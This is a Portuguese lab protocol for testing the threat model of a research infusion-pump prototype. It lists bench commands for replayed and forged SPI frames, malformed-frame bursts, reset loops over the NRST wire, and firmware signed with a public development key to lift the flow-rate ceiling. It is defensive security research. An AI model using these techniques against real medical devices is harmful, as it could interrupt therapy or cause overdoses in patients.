# Roteiro de bancada — Modelo de ameaça (item 1 do IEEE)

**Bancada:** Nucleo-U575ZI-Q (domínio crítico, Zephyr) + Raspberry Pi 3B+ (domínio de conectividade, Yocto)
**Objetivo:** executar, a partir da posição de cada adversário, uma ameaça por vez, e registrar se a fronteira declarada segurou. O resultado é a tabela de rastreamento *ameaça → experimento → arquivo → veredicto* que o IEEE pediu.
**Tempo estimado:** 1 dia de bancada (≈ 7 h), dividido em quatro blocos que podem ser feitos em dias diferentes.

---

## 0. Leia antes de ligar nada

### 0.1 O que este roteiro mede — e o que não mede

O modelo de ameaça em si é texto. O que a bancada prova é que **cada linha
desse texto tem um experimento por trás**, executado da posição do adversário
declarado, com observável físico quando há um. Por isso a regra deste roteiro:

> **O analisador lógico é o juiz.** O que o MCU *diz* pelo SPI (status, vazão
> configurada) é o relato do próprio sistema sob ataque. O que o pino do motor
> *faz* é a evidência. Sempre que houver os dois, registre os dois.

### 0.2 Quatro achados do código que este roteiro testa

Ao preparar o roteiro li o firmware e as ferramentas. Quatro pontos não
aparecem no artigo e mudam o modelo de ameaça. Eles estão formulados como
**hipóteses**: a bancada confirma ou derruba.

| # | Achado no código | Hipótese a testar | Experimento |
|---|---|---|---|
| H1 | O build da Nucleo assina o firmware com `root-rsa-2048.pem`, **a chave de desenvolvimento do MCUboot, publicada no repositório dele** (`Argus_MCPS_Blackpill_STM32F411_ZephyrRTOS/build/nucleo_u575zi_q/mcuboot/zephyr/.config`; a Blackpill a fixa explicitamente em `boards/blackpill_f411ce.conf:33`). E `main.c:33` confirma a imagem incondicionalmente no boot | um gateway comprometido consegue gravar firmware arbitrário no domínio crítico e reescrever o teto de vazão | T7d |
| H2 | `hub.c:442` aceita `OTA_START` em qualquer estado; `ota_handler.c:95` reinicia o MCU 2 s após o fim | uma atualização durante a infusão interrompe a terapia, e após o boot o estado é `IDLE` — a infusão **não** retoma | T7e |
| H3 | ~~Quadros rejeitados por CRC acumulam `spi_consecutive_errors` e o primeiro erro de driver depois reinicia o MCU~~ **Refutada pelos testes unitários** (`test/bancada01`, cenário `reinicio`): `process_valid_packet()` zera o contador *antes* de validar o CRC (`hub.c:208`), então ele nunca passa de 1 com quadros malformados. O que reinicia são **11 erros de driver consecutivos** (`hub.c:701`) | o gateway reinicia o MCU forçando erros de driver — por exemplo, com relógio fora de especificação | T4c |
| H4 | `argus_attack` já tem o experimento **E14** (reset em laço por GPIO 4 → NRST), que não está no artigo | o fio de reset é um canal do gateway para o domínio crítico que **não passa pelo protocolo** — e, ao voltar do reset, a bomba fica em `IDLE` | T9, T5c |

Se H1 se confirmar, a frase central do artigo — *"F3 holds independently of F1
and F2"* — deixa de valer para o canal de atualização, e isso precisa ir para o
modelo de ameaça e para os riscos residuais **antes** do camera-ready. É o
experimento mais importante deste roteiro.

### 0.3 Uma inconsistência de procedência que não é deste roteiro, mas precisa de decisão

O artigo diz que o domínio crítico é um **STM32F411 Blackpill a 100 MHz** e o
gateway uma **Raspberry Pi Zero 2W** (`argus_conference.tex:94`, `:125`, `:148`).
A campanha publicada (`resultados/bench-p3v2/environment.txt`) registra
`host=raspberrypi3`, e o firmware da Nucleo roda a 160 MHz. A placa do MCU não
ficou registrada. Esta campanha corrige isso na origem (passo 3.3), mas o texto
do artigo precisa ser reconciliado com o hardware que de fato gerou os números —
decisão pendente, fora deste roteiro.

### 0.4 Segurança da bancada

- **Sem seringa, sem fluido.** Vários experimentos fazem o motor girar em
  vazão máxima ou com firmware adulterado. Se o driver do motor estiver ligado,
  deixe o fuso livre ou desconecte o motor e observe só o pino STEP.
- O experimento T7d grava firmware adulterado de propósito. A seção 8 restaura
  o firmware legítimo por `west flash` (ST-Link), que não depende do OTA.
- As chaves de teste do T8 são geradas **fora do repositório**, em
  `~/argus-bancada-ameaca/`. Nada desse diretório vai para o git.

### 0.5 Rode os testes unitários antes

Parte do que este roteiro mede já tem verificação sem hardware. Os testes
rodam em segundos e pegam, antes da bancada, um roteiro que ficou velho em
relação ao código:

```bash
cd ~/Documents/Argus_Artigo/Argus_MCPS_Blackpill_STM32F411_ZephyrRTOS
west twister -T test/bancada01 -p native_sim/native/64
python3 -m pytest test/bancada01_estatico
```

```bash
cd ~/Documents/Argus_Artigo/Argus_MCPS_RPi-Zero2W_YoctoProject
cmake -S test -B test/build && cmake --build test/build -j && ctest --test-dir test/build
python3 -m pytest test/config
```

Os testes já estabeleceram: semântica de rejeição do T1b, replay e forja
aceitos (T2, T3), rajada de CRC sem reinício (T4b), reinício no 11º erro de
driver (T4c), autonomia com barramento mudo (T5), OTA aceito durante a
infusão (T7e) e boot em IDLE (T9). **A bancada confirma no hardware; não
descobre do zero.** Os detalhes estão em `test/README.md` de cada repositório.

---

## 1. Modelo de ameaça operacional

É o modelo que a bancada exercita. Ele é a versão do plano 01 **corrigida pelos
achados do 0.2**: as fronteiras F2' e F2'' são novas.

### 1.1 Adversários

| ID | Posição | Capacidades | Onde roda nesta bancada |
|---|---|---|---|
| **A1** | Rede, sem certificado válido | observa e injeta tráfego até a porta 8883 | **PC host**, na mesma LAN da RPi |
| **A2** | Gateway comprometido (root) | mestre do SPI, GPIO 4 (NRST), GPIO 5, canal OTA, todas as credenciais do gateway | **shell root na RPi** |
| A3 | Acesso físico à placa | — | **fora de escopo** |

### 1.2 Fronteiras

```
 A1 ─┤F1: mTLS + ACL├─ gateway (RPi) ═══ A2 vive aqui ═══╗
                                                         ║
            ┌───────────────┬────────────────────────────╫──────────────┐
            │ F2: protocolo │ F2': fio de reset          │ F2'': OTA    │
            │ SPI, CRC-16   │ GPIO 4 → NRST              │ MCUboot RSA  │
            └───────┬───────┴────────────┬───────────────┴──────┬───────┘
                    ▼                    ▼                      ▼
           domínio crítico (Nucleo-U575, Zephyr)
                    │
             F3: validação local (teto 1.200 mL/h, máquina de estados)
                    │
                pino STEP (PA0) → motor
```

F2' e F2'' são canais do gateway até o domínio crítico que **não passam pela
validação de protocolo**. O artigo hoje modela só F2.

### 1.3 Ameaças × experimentos

| ID | Ameaça | Adv. | Fronteira | Experimento | Ferramenta |
|---|---|---|---|---|---|
| T1 | Dose excessiva comandada | A2 | F3 | E13 ×25 + PWM no analisador | `argus-attack` |
| T2 | Replay de comando válido | A2 | F2 | E7 ×10 | `argus-attack` |
| T3 | Quadro forjado (aborto) | A2 | F2 | E8 ×30 + PWM | `argus-attack` |
| T4a | Quadro truncado isolado | A2 | F2 | E9 ×20 | `argus-attack` |
| T4b | Rajada de quadros malformados | A2 | F2 | `--fault-every 1`, N crescente | `argus-bench` |
| T4c | **Erros de driver induzidos pelo relógio** | A2 | F2 | `--spi-hz 2000000` | `argus-bench` |
| T5a | Morte do processo do gateway | A2/falha | — | `kill -9` durante infusão | shell |
| T5b | Perda de energia do gateway, sem fio NRST | falha | — | desligar RPi | — |
| T5c | **Perda de energia do gateway, com fio NRST** | falha | F2' | desligar RPi | — |
| T6 | Exaustão de recursos do gateway | A2 | — | `baseline` vs. `combined` (referência) | `run_campaign.sh` |
| T7a | Bundle RAUC adulterado | A2 | F2''(gw) | `rauc install` | `rauc` |
| T7b | Imagem do MCU corrompida | A2 | F2'' | byte invertido | `stm32-updater` |
| T7c | Imagem do MCU com chave estranha | A2 | F2'' | build com outra chave | `stm32-updater` |
| T7d | **Imagem do MCU assinada com a chave pública do MCUboot** | A2 | F2'' | teto alterado para 65.000 mL/h | `stm32-updater` |
| T7e | **OTA legítimo durante a infusão** | A2 | F2'' | atualizar com bomba infundindo | `stm32-updater` |
| T8 | Falha de certificado (C1–C6) | A1 | F1 | `mosquitto_pub` | host |
| T9 | **Reset em laço pelo fio NRST** | A2 | F2' | E14 ×20 | `argus-attack` |

---

## 2. Material e ligações

### 2.1 Material

- Nucleo-U575ZI-Q + cabo USB (ST-Link: gravação e console VCP)
- Raspberry Pi 3B+ com a imagem Yocto da campanha (`argus-bench`, `argus-attack`, `run_campaign.sh`, `stm32-updater`, `mosquitto`, `rauc`)
- Analisador lógico fx2lafw (8 canais) + `sigrok-cli`/PulseView no host — mesma configuração de `ANALISADOR_LOGICO.md`
- PC host na mesma LAN da RPi, com `mosquitto-clients`, `openssl`, `west` e o ambiente Zephyr (`~/zephyrproject`)
- Resistor de **1 kΩ** para a linha de reset
- Jumpers

### 2.2 Ligações RPi ↔ Nucleo

Pinos da Nucleo conforme `control-domain/boards/nucleo_u575zi_q.overlay`
(o README ainda cita PA2 para o READY; **o overlay vale: PB3**).

| Sinal | RPi 3B+ (BCM / pino físico) | Nucleo-U575ZI-Q | Observação |
|---|---|---|---|
| SCLK | GPIO 11 / pino 23 | PA5 / CN7-10 | |
| MOSI | GPIO 10 / pino 19 | PA7 / CN7-14 | |
| MISO | GPIO 9 / pino 21 | PA6 / CN7-12 | |
| CS (CE1) | GPIO 7 / pino 26 | PA4 / CN7-9 | **não** usar o Arduino D10, que é PD14 |
| DATA READY | GPIO 5 / pino 29 (entrada) | PB3 / CN7-15 | |
| RESET | GPIO 4 / pino 7 (saída) | NRST, via **1 kΩ em série** | **só** para T5c e T9 — deixe desligado no resto |
| GND | pino 6 (ou 9, 14, 20, 25) | GND | comum, obrigatório |

O ponto de NRST na Nucleo-144: use o pino marcado **NRST** na serigrafia do
conector de alimentação Arduino/Zio (CN8). **Confirme na UM2861** antes de
soldar ou espetar. O resistor em série existe porque o ST-Link também dirige o
NRST; sem ele, os dois drivers brigam quando o `west flash` tenta resetar a
placa.

### 2.3 Canais do analisador lógico

| Canal | Sinal | Pino | Para que serve |
|---|---|---|---|
| D0 | STEP do motor | PA0 (TIM2_CH1) / CN10-29 | **o juiz**: frequência = vazão real |
| D1 | Marcador A (quadro decodificado) | PA8 / CN10-31 | instante da decisão |
| D2 | Marcador B (atuação) | PE0 / CN10-33 | instante da atuação |
| D3 | DATA READY | PB3 / CN7-15 | atividade do barramento |
| D4 | NSS | PA4 / CN7-17 (mesmo sinal do CN7-9) | transações SPI |
| D5 | NRST | NRST | reset do MCU |
| D6 | MOTOR EN | PB14 (conector morpho CN12; confira na UM2861) | opcional: habilitação do driver (só confirma o T3; pode ficar solto) |
| D7 | livre | — | — |

**Frequência esperada no STEP**, calculada de `motor_driver.c` (seringa de
20 mm, 1.600 passos/mm, truncamento de `uint32_t`):

| Vazão (mL/h) | STEP (Hz) | Período |
|---|---|---|
| 50 | 70 | 14,29 ms |
| 600 | 848 | 1,179 ms |
| 1.200 (teto) | **1.697** | 589 µs |
| 5.000 (T7d) | 7.073 | 141 µs |
| 65.000 (T7d) | ≈ 92.000 | ≈ 11 µs (resolução do TIM2: 1 µs) |

Regra de ouro: **se em algum experimento D0 passar de 1.697 Hz com o firmware
legítimo, a fronteira F3 falhou**, independentemente do que o status diga.

Taxas de amostragem:

- até 15 s de captura, eventos finos: `samplerate=4m`, `samples=60M`
- capturas longas (T5, T9), só presença/ausência de STEP: `samplerate=200k` — 120 s = `samples=24M`

---

## 3. Preparação (≈ 45 min)

### 3.1 Firmware legítimo na Nucleo

> **Feito em 21/10/2026, por OTA.** Imagem v1.1.23 do commit `5dd34d1`
> (`Argus_MCPS_Blackpill_STM32F411_ZephyrRTOS`, sem alterações locais),
> assinatura verificada com `imgtool`, enviada pelo `stm32-updater` da imagem
> em 45 s, sem retransmissões. Reinício confirmado pelas métricas do MCU
> (53 quadros e 227 voltas do laço depois do OTA). Arquivos:
>
> | | |
> |---|---|
> | imagem enviada | `~/argus-bancada-ameaca/imagens/legitimo_v1.1.23_5dd34d1.signed.bin` e `/data/ota/` na RPi |
> | imagem anterior (12/09, guardada) | `~/argus-bancada-ameaca/imagens/anterior_argus_nucleo_u575zi_q_v1.1.23_20260912.bin` |
> | commit | `~/argus-bancada-ameaca/firmware_commit.txt` |
> | log do OTA | `/data/ota/ota_20261021.log` na RPi |
>
> As duas imagens v1.1.23 (a de 12/09 e a de 21/10) têm o **mesmo corpo**:
> SHA-256 do código idêntico. Elas diferem só na assinatura, porque o MCUboot
> assina com RSA-PSS, que é aleatório a cada assinatura. Qualquer uma das duas
> no slot 0 é o mesmo firmware.
>
> Uma leitura da flash pelo ST-Link em modo `HOTPLUG` (MCU rodando) devolveu
> dados inconsistentes, inclusive option bytes todos zerados — não use esse
> modo para conferir a flash nesta placa.
>
> Para refazer por OTA (sem ST-Link no host), com o `infusion-pump` parado:
>
> ```sh
> stm32-updater /data/ota/legitimo_v1.1.23_5dd34d1.signed.bin
> sleep 10; argus-versao          # versao=1.1.23 estado=1 (IDLE)
> ```

Para gravar pelo ST-Link, no host:

```bash
mkdir -p ~/argus-bancada-ameaca/imagens
cd ~/Documents/Argus_Artigo/argus-amp-infusion-pump/control-domain
git rev-parse HEAD > ~/argus-bancada-ameaca/firmware_commit.txt
west build -p always -b nucleo_u575zi_q --sysbuild . -d build-legitimo
west flash -d build-legitimo
```

Guarde o artefato legítimo assinado — é a referência para conferir assinaturas
no Bloco C (a restauração em si é por `west flash`, seção 8):

```bash
cp build-legitimo/control-domain/zephyr/zephyr.signed.bin ~/argus-bancada-ameaca/imagens/legitimo.signed.bin
```

> Se o diretório do app dentro de `build-legitimo/` tiver outro nome, use
> `find build-legitimo -name zephyr.signed.bin`. Confirme a assinatura antes de
> seguir:
>
> ```bash
> python3 ~/zephyrproject/bootloader/mcuboot/scripts/imgtool.py verify \
>   -k ~/zephyrproject/bootloader/mcuboot/root-rsa-2048.pem \
>   ~/argus-bancada-ameaca/imagens/legitimo.signed.bin
> ```

### 3.2 Console do MCU gravado em arquivo, com hora

> **Sem o USB da Nucleo no host** (como em 21/10), não há console. O juiz
> passa a ser o `argus-versao`, na RPi: imprime a versão do firmware e o
> estado da bomba pelo próprio barramento. Ele substitui a leitura do banner
> no Bloco C. O que **só** o console mostra — `FALHA CRITICA`, `REJEITADO`,
> as linhas `Motor ON/OFF` — fica sem registro; nesse caso, o analisador
> lógico (D0, D5) é a evidência.

Com o USB da Nucleo no host, num terminal **aberto durante toda a bancada**:

```bash
mkdir -p ~/argus-bancada-ameaca/vcp
stty -F /dev/ttyACM0 115200 raw -echo
ts '%Y-%m-%dT%H:%M:%.S' < /dev/ttyACM0 | tee ~/argus-bancada-ameaca/vcp/console.log
```

(`ts` vem do pacote `moreutils`.) Depois de cada `west flash` a VCP pode
reenumerar; se o log parar, rode de novo as duas últimas linhas. É por este log que se detectam reinícios —
procure a linha `--- ARGUS MPCS BOOT` — e o estado do motor, nas linhas
`Motor ON: Estado=` / `Motor OFF: Estado=`.

Estados (`protocol_defs.h`): **0** POWER_ON · **1** IDLE · **2** RUNNING ·
3 BOLUS · 4 PURGE · **5** PAUSED · 6 KVO · **7** END_INFUSION · 8–10 alarmes ·
11 OFF. (Conferido pelo teste `test_ordem_dos_estados_usada_na_leitura_do_console`.)

Nos primeiros ~100 ms depois de um boot, `GET_STATUS` relata **POWER_ON (0)**:
o hub só recebe o estado do motor lógico ao fim da primeira volta do laço.

### 3.3 Biblioteca da campanha na RPi

Tudo o que a campanha precisa na RPi fica num arquivo só, para sobreviver a
reconexões e para os comandos disparados do host por `ssh` enxergarem as mesmas
funções. Na RPi (`ssh root@<ip-da-pi>`), **uma única vez**:

```sh
systemctl stop infusion-pump          # disputa o /dev/spidev0.1
mkdir -p /data/bin /data/ota

DATA=$(date +%Y%m%d)
cat > /data/ameaca_lib.sh <<EOF_LIB
export OUT=/data/bench-ameaca-$DATA
EOF_LIB
cat >> /data/ameaca_lib.sh <<'EOF_LIB'
mkdir -p "$OUT"

# Ferramentas compiladas do fonte atual (21/10/2026). As de /usr/bin sao da
# imagem v1.0.10 e NAO tem --run-rate, --spi-hz nem --show-config; as de
# /data/bin geraram a campanha publicada e ficam intocadas.
export PATH=/data/bancada01/bin:$PATH

# Registro unico da campanha: ameaca,experimento,rep,metrica,valor
reg() { echo "$1,$2,$3,$4,$5" >> "$OUT/ameacas.csv"; }

# Poe a bomba infundindo e larga o barramento SEM mandar pausa.
# O argus-bench pausa a infusao ao sair normalmente (argus_bench.cpp:375);
# morto com -9, nao pausa, e a bomba segue sozinha.
infundir() {
    argus-bench --run-rate "${1:-600}" -n 1000000 --interval-us 2000 \
                --cmd status -o /dev/null >/dev/null 2>&1 &
    sleep 2
    kill -9 $! 2>/dev/null
    sleep 0.5
}

# Pausa por comando legitimo: --run-rate 1 configura, roda e, ao sair
# normalmente, manda PAUSE. Confira no console: "Motor OFF: Estado=5".
pausar() {
    argus-bench --run-rate 1 -n 1 --cmd status -o /dev/null >/dev/null 2>&1
}

# Descarta os contadores do MCU (a leitura de metricas e destrutiva)
zerar_metricas() {
    argus-bench -n 1 --cmd status -o /dev/null --metrics /dev/null >/dev/null 2>&1
}
EOF_LIB

. /data/ameaca_lib.sh
echo "ameaca,experimento,rep,metrica,valor" > "$OUT/ameacas.csv"

{
  echo "data=$(date '+%Y-%m-%dT%H:%M:%S%z')"
  echo "gateway_modelo=$(tr -d '\0' < /proc/device-tree/model)"
  echo "mcu_placa=nucleo_u575zi_q"
  echo "mcu_clock_hz=160000000"
  echo "mcu_firmware=v1.1.23 commit 5dd34d1b0c5c1286dea852857481b7c67e1eca5d (OTA 21/10)"
  echo "ferramentas=$(md5sum /data/bancada01/bin/* | tr '\n' ' ')"
  echo "kernel=$(uname -a)"
  echo "ota_version=$(cat /etc/ota_version.txt 2>/dev/null | tr '\n' ' ')"
  argus-bench --show-config
  echo "--- rauc ---"; rauc status 2>&1 | head -n 20
  echo "--- mount / ---"; mount | grep ' / '
} > "$OUT/environment.txt"
```

As linhas `gateway_modelo`, `mcu_placa` e `mcu_clock_hz` são justamente o que
faltou na campanha publicada (ver 0.3). O `/` da imagem é somente leitura —
por isso tudo que for gravado (binários de teste, imagens OTA) vai para `/data`.

> Em qualquer shell novo na RPi: `. /data/ameaca_lib.sh`. **Não** recrie o
> cabeçalho do `ameacas.csv`.

### 3.4 Atalhos no host

Num segundo terminal do host:

```bash
export PI=root@<ip-da-pi>
export B=~/argus-bancada-ameaca
mkdir -p $B/la $B/t8 $B/imagens $B/chaves

# Roda na RPi com a biblioteca carregada. Use aspas SIMPLES para que
# $OUT seja expandido la, e nao aqui.
pi()  { ssh -o ConnectTimeout=8 "$PI" ". /data/ameaca_lib.sh; $*"; }

# Captura do analisador: cap <nome> <taxa> <amostras>
cap() { sigrok-cli -d fx2lafw --config samplerate="$2" --samples "$3" \
                   -C D0,D1,D2,D3,D4,D5,D6 -o "$B/la/$1.sr"; }
```

Padrão usado em todo o roteiro — captura em segundo plano, ataque disparado
logo depois, espera a captura terminar:

```bash
cap NOME 4m 60M &  sleep 1;  pi 'COMANDO';  wait
```

### 3.5 Taxa de erro espontânea do barramento — **obrigatório antes dos ataques**

A 500 kHz em modo interrupção, o escravo tem 0,5–1,3 % de quadros rejeitados
em consulta contínua e 0 % na cadência das campanhas (comentário do overlay,
medição de 12/09/2026). Os experimentos T4 só têm leitura se essa taxa de
fundo for conhecida **hoje**, nesta montagem:

```sh
zerar_metricas
argus-bench -n 5000 --cmd mix --label ref_erros \
            -o $OUT/R0_erros_rep1.csv --metrics $OUT/R0_erros_rep1_mcu.csv
```

Anote `crc_errors`, `driver_errors` e `spi_resets` de `R0_erros_rep1_mcu.csv`.

**Erros de driver isolados são esperados nesta placa.** No console aparecem
como `spi_stm32_get_err: err=32` seguido de `Erro SPI Driver: -5` e, na
transação seguinte, `SPI Recuperado! Erros zerados.` O valor 32 é o bit UDR
(*underrun*) do SPI do U5: o gateway clocou antes de o escravo ter o que
transmitir — a corrida do DATA READY descrita no README do firmware (o pino
sobe antes de o periférico estar armado). Observado em 21/10 com o
`infusion-pump` rodando: um a cada ~27 s.

Eles não interferem no T4c: o contador de erros consecutivos volta a zero no
quadro válido seguinte, e o reinício exige 11 erros **seguidos**. Pare e
refaça a fiação só se:

- `crc_errors > 0` nesta medição em repouso; ou
- o console mostrar dois `Erro SPI Driver` sem `SPI Recuperado` entre eles; ou
- `driver_errors` passar de ~1 % das transações.

---

## 4. Bloco A — protocolo e validação local (F2, F3) · ≈ 2 h

Pré-condição: fio de reset (GPIO 4 → NRST) **desligado**.

### T1 — Dose excessiva comandada (A2 → F3)

**Hipótese.** O domínio crítico nunca põe no STEP uma frequência acima da do
teto (1.697 Hz), qualquer que seja o valor pedido.

**Atenção à semântica — este experimento decide um texto do artigo.**
`logic_engine.c:260` **rejeita** a vazão fora da faixa e *mantém a anterior*;
ele não satura no teto. A Tabela III diz que 5.000 e 65.000 mL/h foram
"limited to the 1,200 mL/h ceiling", mas na sequência do E13
(600 → 1.200 → 5.000 → 65.000) a vazão anterior aos pedidos excessivos **era**
1.200 — a coincidência produz o mesmo número. T1b separa as duas leituras.

**T1a — sequência publicada, com o juiz físico.** No host:

```bash
pi 'infundir 600'
cap T1a_rep01 4m 60M &  sleep 1;  pi 'argus-attack --only E13 -o $OUT/T1a_E13_rep01.csv';  wait
pi 'pausar'
```

E as 24 repetições restantes, sem captura (a física já foi vista na primeira):

```bash
for r in $(seq -w 2 25); do
  pi "infundir 600; argus-attack --only E13 -o \$OUT/T1a_E13_rep$r.csv >/dev/null; pausar"
done
```

**T1b — ordem invertida (exige o patch do Apêndice A).** Pedidos
600 → 5.000 → 65.000 → 1.200:

```bash
pi 'infundir 600'
cap T1b_rep01 4m 60M &  sleep 1
pi '/data/bancada01/bin/argus-attack-rates --only E13 --rates 600,5000,65000,1200 -o $OUT/T1b_E13_rep01.csv'
wait;  pi 'pausar'
```

**Observáveis.**

| Onde | O quê |
|---|---|
| `T1*_E13_*.csv` | `pedido_<v>_efetivo` (o que o MCU *relata*) |
| analisador, D0 | frequência do STEP após cada pedido (o que o MCU *faz*) |
| console | `REJEITADO: vazao <v> mL/h fora da faixa` |

**Leitura.**

| Resultado em T1b | Conclusão | Texto do artigo |
|---|---|---|
| 5.000 e 65.000 → STEP fica em **848 Hz** | rejeição com retenção | trocar "limited to the ceiling" por "rejected; the previously configured rate was retained" |
| 5.000 e 65.000 → STEP vai a **1.697 Hz** | saturação no teto | o texto atual está certo |
| D0 > 1.697 Hz em qualquer ponto | **F3 falhou** | parar a bancada e investigar |

**Registro** (na RPi, depois de ler as capturas):

```sh
reg T1 E13 25 pedidos_total 100
reg T1 E13 25 step_max_hz <maior frequencia vista em D0>
reg T1 E13b 1 semantica <rejeicao|saturacao>
```

### T2 — Replay de comando válido (A2 → F2)

**Hipótese (já sabida, agora com física).** O quadro reenviado é aceito
sempre (E7: 20/20 na campanha publicada). O que falta mostrar é a
**consequência**: o E7 reenvia um `SET_CONFIG` de **50 mL/h**. Com a bomba a
600 mL/h, o replay muda a dose para um valor antigo, válido e fora de contexto.

```bash
pi 'infundir 600'
cap T2_rep01 4m 60M &  sleep 1;  pi 'argus-attack --only E7 -o $OUT/T2_E7_rep01.csv';  wait
pi 'pausar'
for r in $(seq -w 2 10); do
  pi "infundir 600; argus-attack --only E7 -o \$OUT/T2_E7_rep$r.csv >/dev/null; pausar"
done
```

**Observáveis.** `aceitos` por repetição (200 reenvios no total); em D0, o
STEP cai de **848 Hz para 70 Hz** no primeiro reenvio.

**Veredicto esperado:** *não contido em F2; exposição limitada por F3* — a dose
muda, mas para um valor dentro da janela terapêutica. É exatamente o risco
residual R1 do plano 06, agora com a frequência medida.

```sh
reg T2 E7 10 reenvios 200
reg T2 E7 10 aceitos <soma>
reg T2 E7 1 step_antes_hz 848
reg T2 E7 1 step_depois_hz <medido>
```

### T3 — Quadro forjado: aborto (A2 → F2)

**Hipótese.** O `ACTION_ABORT` forjado com CRC calculado é aceito e **para a
infusão**. Mede-se o tempo entre a decisão (marcador A) e o último pulso.

```bash
pi 'infundir 600'
cap T3_rep01 4m 60M &  sleep 1;  pi 'argus-attack --only E8 -o $OUT/T3_E8_rep01.csv';  wait

for r in $(seq -w 2 30); do
  pi "infundir 600; argus-attack --only E8 -o \$OUT/T3_E8_rep$r.csv >/dev/null"
done
```

(Não precisa `pausar`: o aborto já para a bomba, e `infundir` religa a partir de
`IDLE`.)

**Observáveis.** `aceito` em cada CSV; no console, `Motor OFF: Estado=1`; na
captura, intervalo **subida de D1 → último pulso de D0** (e descida de D6 (EN), se ligado).

```sh
reg T3 E8 30 aceitos <soma>
reg T3 E8 1 decisao_ate_parada_us <medido>
```

**Leitura para o artigo.** Interromper uma infusão é dano clínico; o argumento
correto (plano 06) é que abortar *já era* autoridade legítima do gateway. O
número novo — tempo até a parada — é o que permite dizer isso sem rodeio.

### T4a — Quadro truncado isolado (A2 → F2)

Repetição da campanha publicada com n maior: 20 × 10 = **200** truncamentos.

```bash
pi 'zerar_metricas'
for r in $(seq -w 1 20); do
  pi "argus-attack --only E9 -o \$OUT/T4a_E9_rep$r.csv >/dev/null"
done
pi 'argus-bench -n 1 --cmd status -o /dev/null --metrics $OUT/T4a_mcu.csv'
```

```sh
reg T4a E9 20 truncamentos 200
reg T4a E9 20 recuperados <soma>
reg T4a E9 20 recuperacao_media_us <media das 20 medias>
```

Os "2,8 ms" publicados devem reaparecer dentro da dispersão. Se não
reaparecerem, anote — é informação sobre a montagem, não sobre a arquitetura.

### T4b — Rajada de quadros malformados (A2 → F2)

**Esperado (já verificado em teste unitário).** Cada quadro recusado recebe
NACK, a infusão continua e o MCU **não** reinicia, qualquer que seja o tamanho
da rajada. O contador de erros consecutivos fica em **1**: `hub.c` o zera no
início de cada quadro, antes de validar o CRC. A bancada confirma isso no
hardware real.

Com a bomba infundindo, rajadas de tamanho crescente:

```bash
pi 'infundir 600'
cap T4b 200k 24M &  sleep 1          # 120 s cobrindo todas as rajadas
for N in 5 10 11 20 100 1000; do
  pi "argus-bench --fault-every 1 -n $N --cmd status -o \$OUT/T4b_N$N.csv 2>>\$OUT/T4b.log"
  sleep 3
done
wait
```

**Observáveis.** No console: `Quadro rejeitado (CRC/estrutura). Erros
consecutivos: 1` (sempre 1) e **ausência** de `FALHA CRITICA` e de `--- ARGUS
MPCS BOOT`. Em D0: o STEP de 848 Hz é contínuo nos 120 s?

> O `argus-bench` conta cada NACK como **erro de sincronia** (`sync_errors`),
> porque o NACK chega como `ACTION_RES` onde se esperava `GET_STATUS_RES`.
> Durante o T4b esse número sobe sem que haja escorregão de enlace nenhum —
> verificado em `test/unit/test_bridge.cpp` do gateway.

```sh
reg T4b rajada 1 max_erros_consecutivos <maior k no console; esperado 1>
reg T4b rajada 1 reinicios <0 ou numero>
reg T4b rajada 1 step_continuo <1|0>
```

### T4c — Erros de driver induzidos pelo relógio (A2 → F2)

O gateway comprometido controla o relógio do barramento. A 2 MHz, o escravo em
modo interrupção não acompanha (94 % de quadros perdidos, medição do overlay).
A pergunta é se isso produz **11 erros de driver consecutivos** — o limiar em
que o hub reinicia o MCU (`hub.c:701`, verificado no cenário `reinicio` dos
testes unitários).

```bash
pi 'zerar_metricas; infundir 600'
cap T4c 200k 12M &  sleep 1
pi 'argus-bench --spi-hz 2000000 -n 200 --cmd status -o $OUT/T4c.csv 2>>$OUT/T4c.log'
wait
```

**Observáveis.** Console: `Erro SPI Driver`, `FALHA CRITICA: Reiniciando
Sistema...`, `--- ARGUS MPCS BOOT`. D0: o STEP para? volta? D5: houve reset?

**Leitura.**

| Resultado | Conclusão |
|---|---|
| sem reinício | os erros a 2 MHz não são consecutivos o bastante; o barramento resiste |
| **reinicia** | o gateway reinicia o MCU **só mudando o relógio** — negação de terapia por F2, sem fio de reset |

Se reiniciar, verifique após o boot: o console mostra `Motor ON`? Se não, a
bomba ficou em `IDLE` e **a terapia não retomou** — o mesmo efeito do T9, por
outro caminho.

```sh
reg T4c relogio 1 reinicio <0|1>
reg T4c relogio 1 erros_de_driver <do T4c.log ou do console>
reg T4c relogio 1 terapia_retomou <0|1>
```

---

## 5. Bloco B — perda do gateway e o fio de reset (F2') · ≈ 1,5 h

Este bloco testa a afirmação de **autonomia** do domínio crítico: a bomba
continua a terapia programada quando o gateway some. A ordem importa: os dois
primeiros sem o fio de reset, os dois últimos com ele.

### T5a — Morte do processo do gateway

`infundir` já faz isso: o processo que comandou a infusão morre com `kill -9`
sem se despedir. Basta observar por tempo longo.

```bash
cap T5a 200k 24M &  sleep 1;  pi 'infundir 600';  wait     # 120 s
pi 'pausar'
```

**Esperado:** STEP a 848 Hz contínuo nos ~118 s após o `infundir`. Nenhuma
linha nova no console.

```sh
reg T5a morte_processo 1 step_continuo_s <segundos de STEP continuo>
```

### T5b — Perda de energia do gateway, **sem** fio de reset

```bash
pi 'infundir 600'
cap T5b 200k 24M &
sleep 20;  echo ">>> DESLIGUE A FONTE DA RPi AGORA";  wait
```

Durante a captura, ao sinal, **puxe a fonte da Raspberry Pi**. As linhas de SPI
ficam flutuando; observe se isso gera quadros espúrios.

**Observáveis.** D0 contínuo? Console: aparecem `Quadro rejeitado` ou
`Erro SPI Driver` depois do desligamento? Aparece `BOOT`?

Religue a RPi e espere o boot (~1 min). Depois:

```bash
pi 'systemctl stop infusion-pump; pausar'
```

```sh
reg T5b perda_energia_sem_nrst 1 step_continuo <1|0>
reg T5b perda_energia_sem_nrst 1 erros_espurios <contagem no console>
```

### T9 — Reset em laço pelo fio NRST (A2 → F2') · testa H4

**Ligue agora o fio GPIO 4 → 1 kΩ → NRST.** Confira com a RPi ligada e o
`infusion-pump` parado que a Nucleo **não** está presa em reset (o console
continua respondendo a `pi 'argus-bench -n 10 --cmd status -o /dev/null'`).

**Hipótese H4.** Cada pulso de reset reinicia o MCU e, ao voltar, a bomba está
em `IDLE`: a terapia é interrompida no **primeiro** reset e não retoma.

```bash
pi 'infundir 600'
cap T9 200k 24M &  sleep 1
pi 'argus-attack --only E14 --with-reset --reset-cycles 20 -o $OUT/T9_E14.csv'
wait
```

**Observáveis.**

| Onde | O quê |
|---|---|
| `T9_E14.csv` | `indisponibilidade_media_ms` — o que a ferramenta mede hoje |
